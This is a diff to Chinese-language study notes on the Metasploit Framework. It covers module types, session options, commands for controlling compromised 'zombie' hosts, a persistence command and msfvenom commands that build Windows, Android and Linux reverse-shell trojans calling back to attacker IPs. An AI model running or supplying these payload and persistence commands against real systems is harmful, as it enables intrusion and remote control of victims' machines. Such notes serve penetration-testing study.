@@ -1,7 +1,6 @@
 ## 35. MSF（metasploit framework）
 #msf
 ### 35.1 模块
-
 1.   exploits 漏洞攻击模块列表（模块-系统-服务-名称）
 2.   payloads 漏洞负载模块即入侵之后要做什么
 3.   auxiliary 辅助模块，一般用于无载荷攻击
@@ -142,7 +141,6 @@ run #开始执行
 ==先结束对方计算机上的进程再关闭连接==
 
 ### 35.4 session
-
 ```shell
 -e #要使用的有效载荷编码器
 -f #强制开发漏洞，不考虑极小值的大小
@@ -156,7 +154,6 @@ run #开始执行
 ```
 
 ### 35.5 肉鸡基本操作
-
 ```shell
 session #查看所有肉鸡列表（-i 在线的，-i 1打开第一个会话）
 getuid #查看uid
@@ -197,7 +194,9 @@ meterpreter > run persistence -X -i 10 -p 6666 -r 192.168.71.105
 ### 35.7 生成木马
 
 ```shell
-#安卓app:
+#windows
+msfvenom -p windows/meterpreter/reverse_tcp lhost=X.X.X.X lport=4444 -f exe >shell.exe
+#android app:
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.27 LPORT=8888 -o ~/Desktop/test2.apk
 #Linux:
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.27 LPORT=8888 -f elf > shell.elf
